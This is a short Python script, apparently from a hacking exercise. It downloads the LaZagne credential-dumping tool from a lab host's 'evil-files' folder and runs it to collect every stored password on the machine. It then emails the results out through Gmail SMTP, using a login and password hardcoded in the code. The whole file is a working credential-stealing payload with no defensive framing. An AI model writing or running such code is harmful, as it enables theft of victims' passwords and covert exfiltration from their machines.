
import subprocess, smtplib, requests

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as outfile:
		outfile.write(get_response.content)
	
def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()
	
download("http://10.0.2.5/evil-files/laZagne.exe")
result = subprocess.check_output("laZagne.exe all", shell = True)
send_mail("scolow2111@ueab.ac.ke", "colo5115", result)
